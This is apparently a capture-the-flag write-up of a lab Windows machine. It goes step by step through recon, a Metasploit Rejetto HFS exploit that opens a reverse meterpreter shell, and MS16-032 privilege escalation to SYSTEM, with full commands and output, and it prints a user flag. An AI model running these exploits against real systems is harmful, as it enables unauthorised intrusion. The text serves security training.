Target : 10.129.37.65

Full Black Box Engagement

```bash
>  sudo echo "10.129.37.65 optimum.htb" | sudo tee -a /etc/hosts  
Please touch the FIDO authenticator.  
10.129.37.65 optimum.htb  
>  sudo nmap -sC -sV -Pn -O -T4 --min-rate=1000 -p- 10.129.37.65  
Starting Nmap 7.99 ( https://nmap.org ) at 2026-05-20 11:39 +0200   
Nmap scan report for optimum.htb (10.129.37.65)  
Host is up (0.050s latency).  
Not shown: 65534 filtered tcp ports (no-response)  
PORT   STATE SERVICE VERSION  
80/tcp open  http    HttpFileServer httpd 2.3  
|_http-title: HFS /  
|_http-server-header: HFS 2.3  
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port  
Device type: general purpose  
Running (JUST GUESSING): Microsoft Windows 2012|2008|7 (97%)  
OS CPE: cpe:/o:microsoft:windows_server_2012:r2 cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_7  
Aggressive OS guesses: Microsoft Windows Server 2012 R2 (97%), Microsoft Windows 7 or Windows Server 2008 R2 (91%), Microsoft Windows Server 2012 or Windows Server 2012 R2 (89%)  
No exact OS matches for host (test conditions non-ideal).  
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows  
  
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .  
Nmap done: 1 IP address (1 host up) scanned in 147.41 seconds
```

We see this is a Windows target using HttpFileServer httpd 2.3 on port 80 (HTTP), which seems to be the only open port on the fullport scan.

Microsoft Windows Server 2012 R2 seems to be the OS version.

Tried searching on searchsploit :

```zsh
> msfconsole -q
msf > search HttpFileServer httpd 2.3    
  
Matching Modules  
================  
  
  #  Name                                   Disclosure Date  Rank       Check  Description  
  -  ----                                   ---------------  ----       -----  -----------  
  0  exploit/windows/http/rejetto_hfs_exec  2014-09-11       excellent  Yes    Rejetto HttpFileServer Remote Command Execution  
  
  
Interact with a module by name or index. For example info 0, use 0 or use exploit/windows/http/rejetto_hfs_exec
```

Only one exploit, I'll try it.

```bash
msf > use 0  
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp  
msf exploit(windows/http/rejetto_hfs_exec) > check  
[-] Msf::OptionValidateError One or more options failed to validate: RHOSTS.  
msf exploit(windows/http/rejetto_hfs_exec) > set RHOSTS 10.129.37.65  
RHOSTS => 10.129.37.65  
msf exploit(windows/http/rejetto_hfs_exec) > check  
[*] 10.129.37.65:80 - The service is running, but could not be validated.  
msf exploit(windows/http/rejetto_hfs_exec) > set LHOST 10.10.15.155  
LHOST => 10.10.15.155  
msf exploit(windows/http/rejetto_hfs_exec) > set RPORT 80  
RPORT => 80  
msf exploit(windows/http/rejetto_hfs_exec) > exploit  
[*] Started reverse TCP handler on 10.10.15.155:4444    
[*] Using URL: http://10.10.15.155:8080/65EohD9q  
[*] Server started.  
[*] Sending a malicious request to /  
[*] Payload request received: /65EohD9q  
[*] Sending stage (199238 bytes) to 10.129.37.65  
[!] Tried to delete %TEMP%\CPVvvayZuCnMv.vbs, unknown result  
[*] Meterpreter session 1 opened (10.10.15.155:4444 -> 10.129.37.65:49162) at 2026-05-20 12:05:32 +0200  
[*] Server stopped.  
  
meterpreter > sessions -i  
Usage: sessions [options] or sessions [id]  
  
Interact with a different session ID.  
  
OPTIONS:  
  
   -h, --help           Show this message  
   -i, --interact <id>  Interact with a provided session ID  
  
meterpreter > sessions 1  
[*] Session 1 is already interactive.  
meterpreter > sessions -i 1  
[*] Session 1 is already interactive.  
meterpreter > ls  
Listing: C:\Users\kostas\Desktop  
================================  
  
Mode              Size    Type  Last modified              Name  
----              ----    ----  -------------              ----  
040777/rwxrwxrwx  0       dir   2026-05-26 21:03:39 +0200  %TEMP%  
100666/rw-rw-rw-  282     fil   2017-03-18 12:57:16 +0100  desktop.ini  
100777/rwxrwxrwx  760320  fil   2017-03-18 13:11:17 +0100  hfs.exe  
100444/r--r--r--  34      fil   2026-05-26 20:32:50 +0200  user.txt  
  
meterpreter > cat user.txt  
c5ba70505492996b1e7c7083ba9f4f21
```

Found the user flag.

Now, time to attempt Privilege Escalation through Meterpreter, which works on the target's RAM afaik which is pretty useful for stealth.

Then, I'll run shell.

```bash
meterpreter > getuid  
Server username: OPTIMUM\kostas  
meterpreter > sysinfo  
Computer        : OPTIMUM  
OS              : Windows Server 2012 R2 (6.3 Build 9600).  
Architecture    : x64  
System Language : el_GR  
Domain          : HTB  
Logged On Users : 2  
Meterpreter     : x86/windows
meterpreter > shell
C:\Users\kostas\Desktop>cd /  
cd /  
  
C:\>dir  
dir  
Volume in drive C has no label.  
Volume Serial Number is EE82-226D  
  
Directory of C:\  
  
22/08/2013  06:52 ??    <DIR>          PerfLogs  
31/12/2017  07:14 ??    <DIR>          Program Files  
22/08/2013  06:39 ??    <DIR>          Program Files (x86)  
18/03/2017  02:57 ??    <DIR>          Users  
18/03/2017  02:53 ??    <DIR>          Windows  
              0 File(s)              0 bytes  
              5 Dir(s)   5.643.595.776 bytes free  
C:\ cd /Users 
C:\Users>cd /Users/Administrator  
cd /Users/Administrator  
Access is denied.  
  
C:\Users>whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State   
============================= ============================== ========
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled

C:\>whoami  
whoami  
optimum\kostas  
  
C:\>systeminfo
systeminfo  
  
Host Name:                 OPTIMUM  
OS Name:                   Microsoft Windows Server 2012 R2 Standard  
OS Version:                6.3.9600 N/A Build 9600  
OS Manufacturer:           Microsoft Corporation  
OS Configuration:          Standalone Server  
OS Build Type:             Multiprocessor Free  
Registered Owner:          Windows User  
Registered Organization:      
Product ID:                00252-70000-00000-AA535  
Original Install Date:     18/3/2017, 1:51:36 ??  
System Boot Time:          26/5/2026, 9:31:47 ??  
System Manufacturer:       VMware, Inc.  
System Model:              VMware Virtual Platform  
System Type:               x64-based PC  
Processor(s):              1 Processor(s) Installed.  
                          [01]: AMD64 Family 25 Model 1 Stepping 1 AuthenticAMD ~2445 Mhz  
BIOS Version:              Phoenix Technologies LTD 6.00, 12/11/2020  
Windows Directory:         C:\Windows  
System System Directory:         C:\Windows\system32  
Boot Device:               \Device\HarddiskVolume1  
System Locale:             el;Greek  
Input Locale:              en-us;English (United States)  
Time Zone:                 (UTC+02:00) Athens, Bucharest  
Total Physical Memory:     4.095 MB  
Available Physical Memory: 3.543 MB  
Virtual Memory: Max Size:  5.503 MB  
Virtual Memory: Available: 4.995 MB  
Virtual Memory: In Use:    508 MB  
Page File Location(s):     C:\pagefile.sys  
Domain:                    HTB  
Logon Server:              \\OPTIMUM  
Hotfix(s):                 31 Hotfix(s) Installed.  
                          [01]: KB2959936  
                          [02]: KB2896496  
                          [03]: KB2919355  
                          [04]: KB2920189  
                          [05]: KB2928120  
                          [06]: KB2931358  
                          [07]: KB2931366  
                          [08]: KB2938772  
                          [09]: KB2948772  
                          [10]: KB2949621  
                          [11]: KB2954879  
                          [12]: KB2958262  
                          [13]: KB2958263  
                          [14]: KB2961072  
                          [15]: KB2965500  
                          [16]: KB2966407  
                          [17]: KB2967917  
                          [18]: KB2971203  
                          [19]: KB2971850  
                          [20]: KB2973351  
                          [21]: KB2973448  
                          [22]: KB2975061  
                          [23]: KB2976627  
                          [24]: KB2977629  
                          [25]: KB2981580  
                          [26]: KB2987107  
                          [27]: KB2989647  
                          [28]: KB2998527  
                          [29]: KB3000850  
                          [30]: KB3003057  
                          [31]: KB3014442  
Network Card(s):           1 NIC(s) Installed.  
                          [01]: Intel(R) 82574L Gigabit Network Connection  
                                Connection Name: Ethernet0  
                                DHCP Enabled:    Yes  
                                DHCP Server:     10.10.10.2  
                                IP address(es)  
                                [01]: 10.129.37.65  
Hyper-V Requirements:      A hypervisor has been detected. Features required for Hyper-V will not be displayed.
```

Last hotfix indicates : KB3014442.

With a simple search, we find on the microsoft support website that :
"# November 2014 update rollup for Windows RT 8.1, Windows 8.1, and Windows Server 2012 R2

Applies To

Important When you install this update (3000850) from Windows Update, updates 3016437, 3003057, and 3014442 are included in the installation.  
  

The November 2014 update rollup for Windows RT 8.1, Windows 8.1, and Windows Server 2012 R2 resolves issues and includes performance and reliability improvements. We recommend that you apply this update rollup as part of your regular maintenance routines. Check out the [fixed issues](https://support.microsoft.com/en-us/topic/november-2014-update-rollup-for-windows-rt-8-1-windows-8-1-and-windows-server-2012-r2-7be5865b-adaa-dbbf-e2d4-1f819e7c9d87#bkmk_fixed_issues) in this update. Also notice that there is a [prerequisite](https://support.microsoft.com/en-us/topic/november-2014-update-rollup-for-windows-rt-8-1-windows-8-1-and-windows-server-2012-r2-7be5865b-adaa-dbbf-e2d4-1f819e7c9d87#bkmk_prerequisites) and a [restart requirement](https://support.microsoft.com/en-us/topic/november-2014-update-rollup-for-windows-rt-8-1-windows-8-1-and-windows-server-2012-r2-7be5865b-adaa-dbbf-e2d4-1f819e7c9d87#bkmk_restart) to apply this update."

Which means the latest hotfix for this system is from November 2014.

The goal is to find a CVE that is able to help me PrivEsc and that is unpatched after this date, so I'll download the systeminfo.

```bash
C:\>systeminfo > C:\Windows\Temp\optimum-systeminfo.txt  
systeminfo > C:\Windows\Temp\optimum-systeminfo.txt  
  
C:\>download C:\Windows\Temp\optimum-systeminfo.txt /home/vagabond/Downloads  
download C:\Windows\Temp\optimum-systeminfo.txt /home/vagabond/Downloads  
'download' is not recognized as an internal or external command,  
operable program or batch file.  
  
C:\>exit
meterpreter > download C:\Windows\Temp\optimum-systeminfo.txt /home/vagabond/Downloads  
[-] stdapi_fs_stat: Operation failed: The system cannot find the file specified.  
meterpreter > download C:\\Windows\\Temp\\optimum-systeminfo.txt /home/vagabond/Downloads  
[*] Downloading: C:\Windows\Temp\optimum-systeminfo.txt -> /home/vagabond/Downloads/optimum-systeminfo.txt  
[*] Downloaded 3.32 KiB of 3.32 KiB (100.0%): C:\Windows\Temp\optimum-systeminfo.txt -> /home/vagabond/Downloads/optimum-systeminfo.txt  
[*] Completed  : C:\Windows\Temp\optimum-systeminfo.txt -> /home/vagabond/Downloads/optimum-systeminfo.txt
```

After trying to download it directly from the shell (failed) and from meterpreter using the path without the double slashes (failed) I managed to download the systeminfo on my host computer.

```bash
>  cd ~/Downloads  
>  ls -l optimum-systeminfo.txt  
-rw-r--r-- 1 vagabond vagabond 3399 May 26  2026 optimum-systeminfo.txt  
>  ls optimum-systeminfo.txt  
optimum-systeminfo.txt  
>  windows-exploit-suggester --update  
  
[*] initiating winsploit version 3.3...  
[+] writing to file 2026-05-20-mssb.xls  
[*] done  
>  windows-exploit-suggester -d 2026-05-20-mssb.xls -i optimum-systeminfo.txt  
  
[*] initiating winsploit version 3.3...  
[*] database file detected as xls or xlsx based on extension  
[*] attempting to read from the systeminfo input file  
[+] systeminfo input file read successfully (ISO-8859-1)  
[*] querying database file for potential vulnerabilities  
[*] comparing the 32 hotfix(es) against the 266 potential bulletins(s) with a database of 137 known exploits  
[*] there are now 246 remaining vulns  
[+] [E] exploitdb PoC, [M] Metasploit module, [*] missing bulletin  
[+] windows version identified as 'Windows 2012 R2 64-bit'  
[*]    
[E] MS16-135: Security Update for Windows Kernel-Mode Drivers (3199135) - Important  
[*]   https://www.exploit-db.com/exploits/40745/ -- Microsoft Windows Kernel - win32k Denial of Service (MS16-135)  
[*]   https://www.exploit-db.com/exploits/41015/ -- Microsoft Windows Kernel - 'win32k.sys' 'NtSetWindowLongPtr' Privilege Escalation (MS16-135) (2)  
[*]   https://github.com/tinysec/public/tree/master/CVE-2016-7255  
[*]    
[E] MS16-098: Security Update for Windows Kernel-Mode Drivers (3178466) - Important  
[*]   https://www.exploit-db.com/exploits/41020/ -- Microsoft Windows 8.1 (x64) - RGNOBJ Integer Overflow (MS16-098)  
[*]    
[M] MS16-075: Security Update for Windows SMB Server (3164038) - Important  
[*]   https://github.com/foxglovesec/RottenPotato  
[*]   https://github.com/Kevin-Robertson/Tater  
[*]   https://bugs.chromium.org/p/project-zero/issues/detail?id=222 -- Windows: Local WebDAV NTLM Reflection Elevation of Privilege  
[*]   https://foxglovesecurity.com/2016/01/16/hot-potato/ -- Hot Potato - Windows Privilege Escalation  
[*]    
[E] MS16-074: Security Update for Microsoft Graphics Component (3164036) - Important  
[*]   https://www.exploit-db.com/exploits/39990/ -- Windows - gdi32.dll Multiple DIB-Related EMF Record Handlers Heap-Based Out-of-Bounds Reads/Memory Disclosure (MS16-074), PoC  
[*]   https://www.exploit-db.com/exploits/39991/ -- Windows Kernel - ATMFD.DLL NamedEscape 0x250C Pool Corruption (MS16-074), PoC  
[*]    
[E] MS16-063: Cumulative Security Update for Internet Explorer (3163649) - Critical  
[*]   https://www.exploit-db.com/exploits/39994/ -- Internet Explorer 11 - Garbage Collector Attribute Type Confusion (MS16-063), PoC  
[*]    
[E] MS16-032: Security Update for Secondary Logon to Address Elevation of Privile (3143141) - Important  
[*]   https://www.exploit-db.com/exploits/40107/ -- MS16-032 Secondary Logon Handle Privilege Escalation, MSF  
[*]   https://www.exploit-db.com/exploits/39574/ -- Microsoft Windows 8.1/10 - Secondary Logon Standard Handles Missing Sanitization Privilege Escalation (MS16-032), PoC  
[*]   https://www.exploit-db.com/exploits/39719/ -- Microsoft Windows 7-10 & Server 2008-2012 (x32/x64) - Local Privilege Escalation (MS16-032) (PowerShell), PoC  
[*]   https://www.exploit-db.com/exploits/39809/ -- Microsoft Windows 7-10 & Server 2008-2012 (x32/x64) - Local Privilege Escalation (MS16-032) (C#)  
[*]    
[M] MS16-016: Security Update for WebDAV to Address Elevation of Privilege (3136041) - Important  
[*]   https://www.exploit-db.com/exploits/40085/ -- MS16-016 mrxdav.sys WebDav Local Privilege Escalation, MSF  
[*]   https://www.exploit-db.com/exploits/39788/ -- Microsoft Windows 7 - WebDAV Privilege Escalation Exploit (MS16-016) (2), PoC  
[*]   https://www.exploit-db.com/exploits/39432/ -- Microsoft Windows 7 SP1 x86 - WebDAV Privilege Escalation (MS16-016) (1), PoC  
[*]    
[E] MS16-014: Security Update for Microsoft Windows to Address Remote Code Execution (3134228) - Important  
[*]   Windows 7 SP1 x86 - Privilege Escalation (MS16-014), https://www.exploit-db.com/exploits/40039/, PoC  
[*]    
[E] MS16-007: Security Update for Microsoft Windows to Address Remote Code Execution (3124901) - Important  
[*]   https://www.exploit-db.com/exploits/39232/ -- Microsoft Windows devenum.dll!DeviceMoniker::Load() - Heap Corruption Buffer Underflow (MS16-007), PoC  
[*]   https://www.exploit-db.com/exploits/39233/ -- Microsoft Office / COM Object DLL Planting with WMALFXGFXDSP.dll (MS-16-007), PoC  
[*]    
[E] MS15-132: Security Update for Microsoft Windows to Address Remote Code Execution (3116162) - Important  
[*]   https://www.exploit-db.com/exploits/38968/ -- Microsoft Office / COM Object DLL Planting with comsvcs.dll Delay Load of mqrt.dll (MS15-132), PoC  
[*]   https://www.exploit-db.com/exploits/38918/ -- Microsoft Office / COM Object els.dll DLL Planting (MS15-134), PoC  
[*]    
[E] MS15-112: Cumulative Security Update for Internet Explorer (3104517) - Critical  
[*]   https://www.exploit-db.com/exploits/39698/ -- Internet Explorer 9/10/11 - CDOMStringDataList::InitFromString Out-of-Bounds Read (MS15-112)  
[*]    
[E] MS15-111: Security Update for Windows Kernel to Address Elevation of Privilege (3096447) - Important  
[*]   https://www.exploit-db.com/exploits/38474/ -- Windows 10 Sandboxed Mount Reparse Point Creation Mitigation Bypass (MS15-111), PoC  
[*]    
[E] MS15-102: Vulnerabilities in Windows Task Management Could Allow Elevation of Privilege (3089657) - Important  
[*]   https://www.exploit-db.com/exploits/38202/ -- Windows CreateObjectTask SettingsSyncDiagnostics Privilege Escalation, PoC  
[*]   https://www.exploit-db.com/exploits/38200/ -- Windows Task Scheduler DeleteExpiredTaskAfter File Deletion Privilege Escalation, PoC  
[*]   https://www.exploit-db.com/exploits/38201/ -- Windows CreateObjectTask TileUserBroker Privilege Escalation, PoC  
[*]    
[E] MS15-097: Vulnerabilities in Microsoft Graphics Component Could Allow Remote Code Execution (3089656) - Critical  
[*]   https://www.exploit-db.com/exploits/38198/ -- Windows 10 Build 10130 - User Mode Font Driver Thread Permissions Privilege Escalation, PoC  
[*]   https://www.exploit-db.com/exploits/38199/ -- Windows NtUserGetClipboardAccessToken Token Leak, PoC  
[*]    
[M] MS15-078: Vulnerability in Microsoft Font Driver Could Allow Remote Code Execution (3079904) - Critical  
[*]   https://www.exploit-db.com/exploits/38222/ -- MS15-078 Microsoft Windows Font Driver Buffer Overflow  
[*]    
[E] MS15-052: Vulnerability in Windows Kernel Could Allow Security Feature Bypass (3050514) - Important  
[*]   https://www.exploit-db.com/exploits/37052/ -- Windows - CNG.SYS Kernel Security Feature Bypass PoC (MS15-052), PoC  
[*]    
[M] MS15-051: Vulnerabilities in Windows Kernel-Mode Drivers Could Allow Elevation of Privilege (3057191) - Important  
[*]   https://github.com/hfiref0x/CVE-2015-1701, Win32k Elevation of Privilege Vulnerability, PoC  
[*]   https://www.exploit-db.com/exploits/37367/ -- Windows ClientCopyImage Win32k Exploit, MSF  
[*]    
[E] MS15-010: Vulnerabilities in Windows Kernel-Mode Driver Could Allow Remote Code Execution (3036220) - Critical  
[*]   https://www.exploit-db.com/exploits/39035/ -- Microsoft Windows 8.1 - win32k Local Privilege Escalation (MS15-010), PoC  
[*]   https://www.exploit-db.com/exploits/37098/ -- Microsoft Windows - Local Privilege Escalation (MS15-010), PoC  
[*]   https://www.exploit-db.com/exploits/39035/ -- Microsoft Windows win32k Local Privilege Escalation (MS15-010), PoC  
[*]    
[E] MS15-001: Vulnerability in Windows Application Compatibility Cache Could Allow Elevation of Privilege (3023266) - Important  
[*]   http://www.exploit-db.com/exploits/35661/ -- Windows 8.1 (32/64 bit) - Privilege Escalation (ahcache.sys/NtApphelpCacheControl), PoC  
[*]    
[E] MS14-068: Vulnerability in Kerberos Could Allow Elevation of Privilege (3011780) - Critical  
[*]   http://www.exploit-db.com/exploits/35474/ -- Windows Kerberos - Elevation of Privilege (MS14-068), PoC  
[*]    
[M] MS14-064: Vulnerabilities in Windows OLE Could Allow Remote Code Execution (3011443) - Critical  
[*]   https://www.exploit-db.com/exploits/37800// -- Microsoft Windows HTA (HTML Application) - Remote Code Execution (MS14-064), PoC  
[*]   http://www.exploit-db.com/exploits/35308/ -- Internet Explorer OLE Pre-IE11 - Automation Array Remote Code Execution / Powershell VirtualAlloc (MS14-064), PoC  
[*]   http://www.exploit-db.com/exploits/35229/ -- Internet Explorer <= 11 - OLE Automation Array Remote Code Execution (#1), PoC  
[*]   http://www.exploit-db.com/exploits/35230/ -- Internet Explorer < 11 - OLE Automation Array Remote Code Execution (MSF), MSF  
[*]   http://www.exploit-db.com/exploits/35235/ -- MS14-064 Microsoft Windows OLE Package Manager Code Execution Through Python, MSF  
[*]   https://www.exploit-db.com/exploits/35236/ -- MS14-064 Microsoft Windows OLE Package Manager Code Execution, MSF  
[*]    
[M] MS14-060: Vulnerability in Windows OLE Could Allow Remote Code Execution (3000869) - Important  
[*]   http://www.exploit-db.com/exploits/35055/ -- Windows OLE - Remote Code Execution 'Sandworm' Exploit (MS14-060), PoC  
[*]   http://www.exploit-db.com/exploits/35020/ -- MS14-060 Microsoft Windows OLE Package Manager Code Execution, MSF  
[*]    
[M] MS14-058: Vulnerabilities in Kernel-Mode Driver Could Allow Remote Code Execution (3000061) - Critical  
[*]   http://www.exploit-db.com/exploits/35101/ -- Windows TrackPopupMenu Win32k NULL Pointer Dereference, MSF  
[*]    
[E] MS13-101: Vulnerabilities in Windows Kernel-Mode Drivers Could Allow Elevation of Privilege (2880430) - Important  
[M] MS13-090: Cumulative Security Update of ActiveX Kill Bits (2900986) - Critical  
[*] done
```

This is a lot of information, but the Windows 2012 Server and PrivEsc is matched in 

```bash
[E] MS16-032: Security Update for Secondary Logon to Address Elevation of Privile (3143141) - Important  
[*]   https://www.exploit-db.com/exploits/40107/ -- MS16-032 Secondary Logon Handle Privilege Escalation, MSF  
[*]   https://www.exploit-db.com/exploits/39574/ -- Microsoft Windows 8.1/10 - Secondary Logon Standard Handles Missing Sanitization Privilege Escalation (MS16-032), PoC  
[*]   https://www.exploit-db.com/exploits/39719/ -- Microsoft Windows 7-10 & Server 2008-2012 (x32/x64) - Local Privilege Escalation (MS16-032) (PowerShell), PoC  
[*]   https://www.exploit-db.com/exploits/39809/ -- Microsoft Windows 7-10 & Server 2008-2012 (x32/x64) - Local Privilege Escalation (MS16-032) (C#)
```

So we will try this :

```bash
>  msfconsole -q  
msf > search MS16-032  
  
Matching Modules  
================  
  
  #  Name                                                           Disclosure Date  Rank    Check  Description  
  -  ----                                                           ---------------  ----    -----  -----------  
  0  exploit/windows/local/ms16_032_secondary_logon_handle_privesc  2016-03-21       normal  Yes    MS16-032 Secondary Logon Handle Privilege Escalation  
  1    \_ target: Windows x86                                       .                .       .      .  
  2    \_ target: Windows x64                                       .                .       .      .  
  
  
Interact with a module by name or index. For example info 2, use 2 or use exploit/windows/local/ms16_032_secondary_logon_handle_privesc  
After interacting with a module you can manually set a TARGET with set TARGET 'Windows x64'
msf > use 0  
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp  
msf exploit(windows/local/ms16_032_secondary_logon_handle_privesc) > set RHOSTS 10.129.37.65  
[!] Unknown datastore option: RHOSTS.  
RHOSTS => 10.129.37.65  
msf exploit(windows/local/ms16_032_secondary_logon_handle_privesc) > check  
[-] Msf::OptionValidateError One or more options failed to validate: SESSION.

#This PrivEsc doesn't seem to care about RHOST but seems to care about SESSION.

msf exploit(windows/local/ms16_032_secondary_logon_handle_privesc) > set SESSION 1  
SESSION => 1  
msf exploit(windows/local/ms16_032_secondary_logon_handle_privesc) > set LHOST 10.10.15.155  
LHOST => 10.10.15.155  
msf exploit(windows/local/ms16_032_secondary_logon_handle_privesc) > set LPORT 4444
msf exploit(windows/local/ms16_032_secondary_logon_handle_privesc) > run  
[-] Msf::OptionValidateError The following options failed to validate: SESSION.  
[-] Exploit failed: undefined method 'type' for nil  
[*] Exploit completed, but no session was created.
```

So there was no valid session.

```bash
>  msfconsole -q  
msf > sessions -l  
  
Active sessions  
===============  
  
No active sessions.  
```

So we will restart the exploit.

```bash
msf > use exploit/windows/http/rejetto_hfs_exec  
  
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp  
msf exploit(windows/http/rejetto_hfs_exec) > set RHOSTS 10.129.37.65  
RHOSTS => 10.129.37.65  
msf exploit(windows/http/rejetto_hfs_exec) > set RPORT 80  
RPORT => 80  
msf exploit(windows/http/rejetto_hfs_exec) > set LHOST 10.10.15.155  
LHOST => 10.10.15.155  
msf exploit(windows/http/rejetto_hfs_exec) > set LPORT 4444  
LPORT => 4444  
msf exploit(windows/http/rejetto_hfs_exec) > run  
[*] Started reverse TCP handler on 10.10.15.155:4444    
[*] Using URL: http://10.10.15.155:8080/aQ8lU9QBa  
[*] Server started.  
[*] Sending a malicious request to /  
[*] Payload request received: /aQ8lU9QBa  
[*] Sending stage (199238 bytes) to 10.129.37.65  
[!] Tried to delete %TEMP%\VIvkSqhpnZ.vbs, unknown result  
[*] Meterpreter session 1 opened (10.10.15.155:4444 -> 10.129.37.65:49167) at 2026-05-20 13:17:44 +0200  
[*] Server stopped.
  
meterpreter > sessions 1  
[*] Session 1 is already interactive.  
```

Then, we start a listener on multi/handler and put the original foothold exploit in background :

```
meterpreter > background  
[*] Backgrounding session 1...  
msf exploit(windows/http/rejetto_hfs_exec) > use exploit/multi/handler  
[*] Using configured payload generic/shell_reverse_tcp  
msf exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp  
payload => windows/meterpreter/reverse_tcp  
msf exploit(multi/handler) > set LHOST 10.10.15.155  
LHOST => 10.10.15.155  
msf exploit(multi/handler) > set LPORT 4445  
LPORT => 4445  
msf exploit(multi/handler) > run -j  
[*] Exploit running as background job 0.  
[*] Exploit completed, but no session was created.  
  
[*] Started reverse TCP handler on 10.10.15.155:4445    
```

Now that we have an actual session running, we come back to the MS16-032 privesc exploit :

```bash
msf exploit(multi/handler) > use exploit/windows/local/ms16_032_secondary_logon_handle_privesc  
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp  
msf exploit(windows/local/ms16_032_secondary_logon_handle_privesc) > set LHOST 10.10.15.155  
LHOST => 10.10.15.155  
msf exploit(windows/local/ms16_032_secondary_logon_handle_privesc) > set SESSION 1  
SESSION => 1  
msf exploit(windows/local/ms16_032_secondary_logon_handle_privesc) > set LPORT 4445  
LPORT => 4445  
msf exploit(windows/local/ms16_032_secondary_logon_handle_privesc) > run  
[-] Handler failed to bind to 10.10.15.155:4445:-  -  
[-] Handler failed to bind to 0.0.0.0:4445:-  -  
[+] Compressed size: 1160  
[!] Executing 32-bit payload on 64-bit ARCH, using SYSWOW64 powershell  
[*] Writing payload file, C:\Users\kostas\AppData\Local\Temp\OTrftR.ps1...  
[*] Compressing script contents...  
[+] Compressed size: 3735  
[*] Executing exploit script...  
        __ __ ___ ___   ___     ___ ___ ___    
       |  V  |  _|_  | |  _|___|   |_  |_  |  
       |     |_  |_| |_| . |___| | |_  |  _|  
       |_|_|_|___|_____|___|   |___|___|___|  
                                              
                      [by b33f -> @FuzzySec]  
  
[?] Operating system core count: 2  
[>] Duplicating CreateProcessWithLogonW handle  
[?] Done, using thread handle: 2112  
  
[*] Sniffing out privileged impersonation token..  
  
[?] Thread belongs to: svchost  
[+] Thread suspended  
[>] Wiping current impersonation token  
[>] Building SYSTEM impersonation token  
[ref] cannot be applied to a variable that does not exist.  
At line:200 char:3  
+         $mWZ = [Ntdll]::NtImpersonateThread($hFFK, $hFFK, [ref]$yvr)  
+         ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~  
   + CategoryInfo          : InvalidOperation: (yvr:VariablePath) [], Runtime    
  Exception  
   + FullyQualifiedErrorId : NonExistingVariableReference  
   
[!] NtImpersonateThread failed, exiting..  
[+] Thread resumed!  
  
[*] Sniffing out SYSTEM shell..  
  
[>] Duplicating SYSTEM token  
Cannot convert argument "ExistingTokenHandle", with value: "", for "DuplicateTo  
ken" to type "System.IntPtr": "Cannot convert null to type "System.IntPtr"."  
At line:259 char:2  
+     $mWZ = [Advapi32]::DuplicateToken($ycI, 2, [ref]$bd_o_)  
+     ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~  
   + CategoryInfo          : NotSpecified: (:) [], MethodException  
   + FullyQualifiedErrorId : MethodArgumentConversionInvalidCastArgument  
   
[>] Starting token race  
[>] Starting process race  
[!] Holy handle leak Batman, we have a SYSTEM shell!!  
  
gBoVnrK4hJf23kVvjMFTStqM65tBylcI  
[+] Executed on target machine.  
[*] Sending stage (199238 bytes) to 10.129.37.65  
[*] Meterpreter session 2 opened (10.10.15.155:4445 -> 10.129.37.65:49174) at 2026-05-20 13:27:51 +0200  
getuid  
[+] Deleted C:\Users\kostas\AppData\Local\Temp\OTrftR.ps1  
[*] Exploit completed, but no session was created.  
msf exploit(windows/local/ms16_032_secondary_logon_handle_privesc) > getuid  
[-] Unknown command: getuid. Run the help command for more details.  
msf exploit(windows/local/ms16_032_secondary_logon_handle_privesc) > run  
[*] Started reverse TCP handler on 10.10.15.155:4445    
[+] Compressed size: 1160  
[!] Executing 32-bit payload on 64-bit ARCH, using SYSWOW64 powershell  
[*] Writing payload file, C:\Users\kostas\AppData\Local\Temp\uQjeoa.ps1...  
[*] Compressing script contents...  
[+] Compressed size: 3733  
[*] Executing exploit script...  
        __ __ ___ ___   ___     ___ ___ ___    
       |  V  |  _|_  | |  _|___|   |_  |_  |  
       |     |_  |_| |_| . |___| | |_  |  _|  
       |_|_|_|___|_____|___|   |___|___|___|  
                                              
                      [by b33f -> @FuzzySec]  
  
[?] Operating system core count: 2  
[>] Duplicating CreateProcessWithLogonW handle  
[?] Done, using thread handle: 2336  
  
[*] Sniffing out privileged impersonation token..  
  
[?] Thread belongs to: svchost  
[+] Thread suspended  
[>] Wiping current impersonation token  
[>] Building SYSTEM impersonation token  
[ref] cannot be applied to a variable that does not exist.  
At line:200 char:3  
+         $lO = [Ntdll]::NtImpersonateThread($uHOI, $uHOI, [ref]$ufur)  
+         ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~  
   + CategoryInfo          : InvalidOperation: (ufur:VariablePath) [], Runtime    
  Exception  
   + FullyQualifiedErrorId : NonExistingVariableReference  
   
[!] NtImpersonateThread failed, exiting..  
[+] Thread resumed!  
  
[*] Sniffing out SYSTEM shell..  
  
[>] Duplicating SYSTEM token  
Cannot convert argument "ExistingTokenHandle", with value: "", for "DuplicateTo  
ken" to type "System.IntPtr": "Cannot convert null to type "System.IntPtr"."  
At line:259 char:2  
+     $lO = [Advapi32]::DuplicateToken($nveUP, 2, [ref]$ln)  
+     ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~  
   + CategoryInfo          : NotSpecified: (:) [], MethodException  
   + FullyQualifiedErrorId : MethodArgumentConversionInvalidCastArgument  
  
[>] Starting token race  
[>] Starting process race  
[!] Holy handle leak Batman, we have a SYSTEM shell!!  
  
KaNG0R0HZUHwvV96ravDtBToMzrI4H7P  
[+] Executed on target machine.  
[*] Sending stage (199238 bytes) to 10.129.37.65  
[*] Meterpreter session 3 opened (10.10.15.155:4445 -> 10.129.37.65:49175) at 2026-05-20 13:28:40 +0200  
[+] Deleted C:\Users\kostas\AppData\Local\Temp\uQjeoa.ps1  
  
meterpreter > getuid  
Server username: NT AUTHORITY\SYSTEM  
meterpreter > ls  
Listing: C:\Users\kostas\Desktop  
================================  
